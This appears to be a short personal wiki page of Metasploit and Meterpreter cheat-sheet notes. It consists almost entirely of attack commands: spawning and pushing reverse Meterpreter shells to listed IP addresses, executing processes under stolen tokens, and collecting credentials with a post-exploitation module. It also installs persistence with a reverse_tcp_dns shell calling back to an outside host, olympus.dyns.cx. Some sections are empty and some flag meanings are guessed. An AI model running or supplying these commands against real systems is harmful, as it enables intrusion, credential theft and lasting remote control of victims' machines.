<!-- TITLE: Metasploit Main -->
<!-- SUBTITLE: A quick summary of Metasploit Main -->


[Back to Tools](/tools)

[Metasploit Site](https://www.metasploit.com/)

[MSFVenom](/msfvenom)



# Meterpreter

Sending Shells to other people

run duplicate -D -r -e executable_to_inject -p 4444 -r listenhost

Next command will send meterpreters to each ip in -mr list

run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 10.128.129.200,10.128.129.201 -p 443

Auto Run Script

set AutoRunScript multi_console_command -rc commands.rc

How to do exec

execute -i -f bash
-i interact
-f foreground I think
will execute the process. exit returns to meterpreter.

Execing with other Token:
incognito
execute -t will use the current token
-h will hide from screen
-c will chanelize it
-i will let you interact with it

Post Exploit
run prefetchtool -l

run post/windows/gather/credential_collector


# Known Attack Patterns
[Pass the Hash](/passthehash)
# Writing Exploits
# Post Module Tricks
run persistence -P windows/meterpreter/reverse_tcp_dns -S -i 9000 -p 9998 -r olympus.dyns.cx
-i - I think is interval

# MSFDB Commands
# MSF RPC Connections